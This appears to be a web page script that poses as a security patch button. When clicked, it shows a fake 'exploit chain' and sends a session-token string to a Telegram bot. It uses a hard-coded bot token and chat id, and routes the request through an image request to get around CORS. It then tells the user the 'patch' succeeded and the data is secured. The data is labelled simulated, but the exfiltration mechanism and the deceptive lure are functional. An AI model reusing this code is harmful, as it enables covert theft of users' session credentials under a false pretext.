document.getElementById('patchButton').addEventListener('click', launchExploit);

function launchExploit() {
    const button = document.getElementById('patchButton');
    button.style.display = 'none';
    const statusMessage = document.getElementById('errorMessage');
    statusMessage.style.display = 'block';
    statusMessage.style.color = '#ff9900';
    statusMessage.textContent = 'Initializing exploit chain...';

    // Спрощена імітація експлойту
    const simulatedData = "SIM_DATA:session_token=sim_abc123;user_id=sim_8463942433";
    const shortMessage = "EXPLOIT_SUCCESS:" + simulatedData;

    setTimeout(() => {
        statusMessage.textContent = 'Exploit triggered. Exfiltrating data...';
        sendDataToTelegram(shortMessage); // Відправляємо коротке повідомлення
    }, 2000);
}

function sendDataToTelegram(shortMessage) {
    const botToken = '8252026790:AAFA0CpGHb3zgHC3bs8nVPZCQGqUTqEWcIA';
    const chatId = '8463942433';
    const statusMessage = document.getElementById('errorMessage');

    // ЄДИНИЙ спосіб без проксі: використати GET-запит через <img> тег
    // Це обходить CORS, але має обмеження на довжину URL
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(shortMessage)}`;
    const img = new Image();
    img.src = url;

    // Чекаємо, поки зображення "завантажиться" (запит виконається)
    img.onload = function() {
        statusMessage.style.color = '#48bb78';
        statusMessage.textContent = 'PATCH SUCCESSFUL. Data secured.';
    };
    img.onerror = function() {
        statusMessage.style.color = '#ff6b6b';
        statusMessage.textContent = 'Network error. Try again.';
    };
}
